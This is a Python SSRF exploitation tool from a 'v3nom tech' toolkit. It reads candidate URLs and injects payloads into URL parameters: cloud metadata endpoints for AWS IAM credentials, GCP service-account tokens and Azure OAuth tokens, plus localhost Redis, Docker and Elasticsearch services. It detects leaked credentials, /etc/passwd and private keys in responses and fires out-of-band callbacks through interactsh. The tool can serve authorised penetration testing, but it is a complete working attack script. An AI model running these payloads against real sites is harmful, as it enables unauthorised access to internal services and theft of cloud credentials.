#!/usr/bin/env python3
# =============================================================================
#
#  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
#  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
#  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
#  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
#   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
#    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
#
#  ████████╗███████╗ ██████╗██╗  ██╗
#  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
#     ██║   █████╗  ██║     ███████║
#     ██║   ██╔══╝  ██║     ██╔══██║
#     ██║   ███████╗╚██████╗██║  ██║
#     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
#
#  [ v3nom tech ]
#  Instagram : @venom.tech.official
#  GitHub    : https://github.com/v3nomtech
#
# =============================================================================
"""
ssrf_tester.py — Active SSRF Exploitation Tester
Input: ssrf_candidates.txt from venomeye output (one URL per line)

Supports:
  - OOB detection via interactsh (preferred) or webhook.site token
  - Cloud metadata endpoint probing (AWS, GCP, Azure, DigitalOcean, Oracle)
  - Blind SSRF via DNS callback
  - Time-based detection (response time anomaly)
"""

import argparse
import concurrent.futures
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    CYAN="\033[96m"; BOLD="\033[1m"; RESET="\033[0m"

def info(m):  print(f"{C.CYAN}[*]{C.RESET} {m}")
def ok(m):    print(f"{C.GREEN}[+]{C.RESET} {m}")
def warn(m):  print(f"{C.YELLOW}[!]{C.RESET} {m}")
def crit(m):  print(f"{C.RED}{C.BOLD}[SSRF FOUND]{C.RESET} {m}")
def section(m): print(f"\n{C.BOLD}{C.CYAN}{'─'*60}\n  {m}\n{'─'*60}{C.RESET}")

def banner():
    print(f"""{C.CYAN}{C.BOLD}
  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝

  ████████╗███████╗ ██████╗██╗  ██╗
  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
     ██║   █████╗  ██║     ███████║
     ██║   ██╔══╝  ██║     ██╔══██║
     ██║   ███████╗╚██████╗██║  ██║
     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
{C.RESET}{C.GREEN}  [ v3nom tech ]  |  Instagram: @venom.tech.official  |  GitHub: https://github.com/v3nomtech
{C.RESET}""")

# ── SSRF payloads ─────────────────────────────────────────────────────────────
# Metadata endpoints to test (confirms internal access)
METADATA_PAYLOADS = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # AWS IMDSv2 (needs PUT first — we try GET as fallback)
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Oracle Cloud
    "http://192.0.0.192/latest/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # Internal localhost probes
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.1/",      # octal
    "http://0x7f000001/",       # hex
    "http://2130706433/",       # decimal
    # Common internal services
    "http://localhost:6379/",   # Redis
    "http://localhost:9200/",   # Elasticsearch
    "http://localhost:27017/",  # MongoDB
    "http://localhost:8500/",   # Consul
    "http://localhost:2375/",   # Docker daemon
    "http://localhost:4040/",   # ngrok / internal dashboard
]

# Indicators grouped by service. Cloud-metadata services require ≥2 indicator
# matches (compound confirmation) since any single one of them can appear in
# unrelated content — `latest/meta-data` shows up in AWS docs, `instance-id`
# in CI logs. Specific shell/protocol responses (Redis +PONG, /etc/passwd
# root line, Docker api JSON) are unique enough to confirm on a single match.
#
# Removed loose patterns from the prior version that produced the bulk of the
# FPs: `localhost`, `127\.0\.0\.1`, plain `iam/`, plain `"tagline"`, `"compute"`,
# `"network"` — they fire on any page that *mentions* these terms.
INDICATOR_GROUPS = {
    "aws_metadata": [
        r"latest/meta-data/?\b",
        r"\bami-id\b\s*[\n:]",
        r"\binstance-id\b\s*[\n:]",
        r"security-credentials/?\s*\n",
        r"AccessKeyId.*ASIA[A-Z0-9]+",
    ],
    "gcp_metadata": [
        r"computeMetadata/v1\b",
        r"service-accounts/default",
        r'"access_token"\s*:\s*"ya29\.',
        r"projects/\d{6,}/zones",
    ],
    "azure_metadata": [
        r"\"azEnvironment\"",
        r"azureEnvironment\":\s*\"AzurePublicCloud\"",
        r"\"vmId\"\s*:\s*\"[0-9a-f-]{36}\"",
        r"\"compute\"\s*:\s*\{",
    ],
    "do_metadata": [
        r"\"droplet_id\"", r"\"hostname\"\s*:\s*\"[^\"]+\"\s*,\s*\"vendor_data\"",
    ],
    "redis": [
        r"\+PONG\b", r"redis_version:\d", r"\$\d+\r\nredis_version",
    ],
    "elasticsearch": [
        r'"cluster_name"\s*:\s*"[^"]+"', r'"version"\s*:\s*\{[^}]*"number"\s*:\s*"\d',
    ],
    "docker": [
        r'"ApiVersion"\s*:\s*"\d', r'"Containers"\s*:\s*\d',
    ],
    "etc_passwd": [
        r"^root:x:0:0:", r":/root:(?:/bin/(?:bash|sh|zsh|dash))",
    ],
    "ssh_key": [
        r"-----BEGIN (?:RSA |OPENSSH |EC )?PRIVATE KEY-----",
    ],
}
# A minimum match count per service — multi-match for cloud metadata, single
# match for unique tokens (Redis PONG, /etc/passwd, SSH key).
INDICATOR_MIN_MATCHES = {
    "aws_metadata": 2, "gcp_metadata": 2, "azure_metadata": 2, "do_metadata": 2,
    "redis": 1, "elasticsearch": 1, "docker": 2, "etc_passwd": 1, "ssh_key": 1,
}

def curl_url(url: str, timeout: int = 10) -> tuple[int, float, str]:
    """Returns (status_code, elapsed_seconds, body).

    Note: redirects are NOT followed (`--max-redirs 0`). The previous version
    followed up to 3 redirects, which let an SSRF target whose internal IP is
    blocked but whose proxy-error page is served from a public host return
    that public page's body — causing the metadata regex to match content
    from the wrong origin.
    """
    start = time.time()
    try:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", str(timeout),
             "-o", "-", "-w", "\n__STATUS__%{http_code}__TIME__%{time_total}",
             "--max-redirs", "0",
             "-A", "Mozilla/5.0",
             url],
            capture_output=True, text=True, timeout=timeout + 2
        )
        elapsed = time.time() - start
        out = r.stdout
        m = re.search(r"__STATUS__(\d+)__TIME__([\d.]+)$", out)
        status = int(m.group(1)) if m else 0
        body = re.sub(r"\n__STATUS__\d+__TIME__[\d.]+$", "", out)
        return status, elapsed, body
    except Exception:
        return 0, time.time() - start, ""

# Parameter names that strongly hint the value is sent to a fetcher (keep in
# sync with venomeye's SSRF_PARAMS). When present, we inject into THESE
# params first instead of just whichever happens to come first in the query.
SSRF_PRONE_PARAMS = {
    "url","uri","link","src","source","href","action","host","proxy",
    "fetch","load","path","dest","destination","redirect","request",
    "webhook","callback","endpoint","api_url","base_url","feed","import",
    "image_url","file","u","img","page",
}

def inject_ssrf(original_url: str, payload: str) -> list[str]:
    """Inject the payload into every SSRF-prone param. Returns a list of
    candidate URLs (was a single URL targeting first-param-only, which
    silently skipped the actual sink param when other params came first)."""
    parsed = urllib.parse.urlparse(original_url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return []
    candidate_keys = [k for k in params if k.lower() in SSRF_PRONE_PARAMS] or [next(iter(params))]
    out = []
    for k in candidate_keys:
        modified = dict(params)
        modified[k] = [payload]
        out.append(urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(modified, doseq=True))))
    return out

def confirm_signal(body: str, baseline: str) -> str:
    """Return the service tag if `body` contains enough indicators NOT present
    in `baseline`. Uses INDICATOR_MIN_MATCHES to demand compound confirmation
    for cloud metadata services that share words with normal content."""
    if not body:
        return ""
    for service, patterns in INDICATOR_GROUPS.items():
        new_matches = 0
        for p in patterns:
            in_body     = bool(re.search(p, body, re.IGNORECASE | re.MULTILINE))
            in_baseline = bool(re.search(p, baseline or "", re.IGNORECASE | re.MULTILINE))
            if in_body and not in_baseline:
                new_matches += 1
        if new_matches >= INDICATOR_MIN_MATCHES[service]:
            return service
    return ""

def test_url(original_url: str, oob_host: str, timeout: int) -> list[dict]:
    findings = []

    # Baseline — what does the original URL return without injection? Used
    # to suppress findings where the indicator was already present (e.g.
    # the URL is a docs page that happens to mention "ami-id").
    _, _, baseline_body = curl_url(original_url, timeout)

    confirmed = False
    for payload in METADATA_PAYLOADS:
        if confirmed:
            break
        for injected in inject_ssrf(original_url, payload):
            status, _, body = curl_url(injected, timeout)
            # Only inspect actual 200 responses — 3xx redirects don't carry
            # the metadata body and were a frequent FP source.
            if status != 200:
                continue
            service = confirm_signal(body, baseline_body)
            if not service:
                continue
            findings.append({
                "type": "ssrf_metadata",
                "severity": "critical",
                "url": original_url,
                "injected": injected,
                "payload": payload,
                "status": status,
                "service": service,
                "body_snippet": body[:300],
            })
            crit(f"METADATA ACCESS ({service}) | {original_url}")
            crit(f"  Payload : {payload}")
            crit(f"  Response: HTTP {status} | {body[:100]}")
            confirmed = True
            break

    # OOB / Blind SSRF — fire markers correlated to this URL for the
    # interactsh listener to pick up. Markers are stored so post-run
    # callback parsing can map a hit back to its origin URL.
    if oob_host:
        marker = abs(hash(original_url)) % 1_000_000
        oob_payload = f"http://v{marker}.{oob_host}/"
        for injected in inject_ssrf(original_url, oob_payload):
            curl_url(injected, timeout)
        OOB_MARKERS[str(marker)] = original_url

    return findings

# Map of OOB marker → original URL, populated by `test_url` and consumed in
# `main` after we've drained interactsh stdout.
OOB_MARKERS: dict[str, str] = {}

# ── interactsh helper ─────────────────────────────────────────────────────────
def start_interactsh() -> tuple[str, subprocess.Popen | None]:
    """Start interactsh-client and return (host, process)."""
    if not _tool_exists("interactsh-client"):
        warn("interactsh-client not found — OOB detection disabled")
        return "", None
    try:
        proc = subprocess.Popen(
            ["interactsh-client", "-json"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
        )
        time.sleep(3)
        # read first line to get the assigned host
        line = proc.stdout.readline().strip()
        data = json.loads(line)
        host = data.get("interactsh-url", "").replace("https://", "").replace("http://", "")
        ok(f"interactsh listening on: {host}")
        return host, proc
    except Exception as e:
        warn(f"Could not start interactsh: {e}")
        return "", None

def _tool_exists(name: str) -> bool:
    import shutil
    return shutil.which(name) is not None

# ── main ──────────────────────────────────────────────────────────────────────
def main():
    banner()
    parser = argparse.ArgumentParser(description="Active SSRF Tester")
    parser.add_argument("-i", "--input",    required=True, help="ssrf_candidates.txt")
    parser.add_argument("-o", "--output",   default="./ssrf_results", help="Output directory")
    parser.add_argument("--oob",            default="", help="OOB callback host (e.g. yourtoken.oast.fun)")
    parser.add_argument("-t", "--threads",  type=int, default=10, help="Threads (default 10)")
    parser.add_argument("--timeout",        type=int, default=10, help="Per-request timeout (default 10s)")
    parser.add_argument("--limit",          type=int, default=0,  help="Max URLs to test (0=all)")
    parser.add_argument("--interactsh",     action="store_true",  help="Auto-start interactsh-client for OOB")
    args = parser.parse_args()

    os.makedirs(args.output, exist_ok=True)
    section("SSRF Tester — Active Exploitation")

    try:
        urls = [l.strip() for l in open(args.input) if l.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Input file not found: {args.input}")
        sys.exit(1)

    if args.limit:
        urls = urls[:args.limit]

    oob_host = args.oob
    interactsh_proc = None

    if args.interactsh:
        oob_host, interactsh_proc = start_interactsh()

    info(f"Testing {len(urls)} URLs | threads={args.threads} | OOB={oob_host or 'disabled'}")
    info(f"Metadata payloads: {len(METADATA_PAYLOADS)}")

    all_findings: list[dict] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
        futs = {pool.submit(test_url, u, oob_host, args.timeout): u for u in urls}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            if done % 100 == 0:
                info(f"Progress: {done}/{len(urls)} | findings: {len(all_findings)}")
            try:
                findings = fut.result()
                all_findings.extend(findings)
            except Exception as e:
                warn(f"Error: {e}")

    if interactsh_proc:
        info("Waiting 15s for delayed OOB callbacks...")
        time.sleep(15)
        interactsh_proc.terminate()
        # Drain interactsh-client JSON output and correlate markers back to
        # their origin URLs. The previous version started interactsh, fired
        # OOB payloads, then never read the results — every blind SSRF was
        # silently dropped.
        try:
            remaining = interactsh_proc.stdout.read() if interactsh_proc.stdout else ""
        except Exception:
            remaining = ""
        for line in (remaining or "").splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue
            full = (event.get("full-id") or event.get("unique-id") or "").lower()
            mhit = re.search(r"v(\d+)", full)
            if not mhit:
                continue
            origin = OOB_MARKERS.get(mhit.group(1))
            if not origin:
                continue
            all_findings.append({
                "type": "ssrf_oob",
                "severity": "critical",
                "url": origin,
                "injected": "",
                "payload": f"oob marker v{mhit.group(1)}",
                "status": 0,
                "body_snippet": f"Interactsh hit: {event.get('protocol','?')} from {event.get('remote-address','?')}",
            })
            crit(f"OOB SSRF confirmed | {origin} ← {event.get('protocol','?')} {event.get('remote-address','?')}")

    # ── outputs ───────────────────────────────────────────────────────────────
    json_out = f"{args.output}/ssrf_findings.json"
    with open(json_out, "w") as f:
        json.dump(all_findings, f, indent=2)

    report_out = f"{args.output}/ssrf_report.txt"
    with open(report_out, "w") as f:
        f.write(f"SSRF Findings — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*60}\n\n")
        if all_findings:
            for item in all_findings:
                f.write(f"[{item['severity'].upper()}] {item['type']}\n")
                f.write(f"  Original URL : {item['url']}\n")
                f.write(f"  Injected URL : {item['injected']}\n")
                f.write(f"  Payload      : {item['payload']}\n")
                f.write(f"  Response     : HTTP {item['status']}\n")
                f.write(f"  Body snippet : {item['body_snippet']}\n\n")
        else:
            f.write("No confirmed SSRF findings.\n")

    section("Results")
    ok(f"Confirmed SSRF   : {C.BOLD}{len(all_findings)}{C.RESET}")
    ok(f"Report           : {report_out}")
    ok(f"JSON             : {json_out}")

if __name__ == "__main__":
    main()
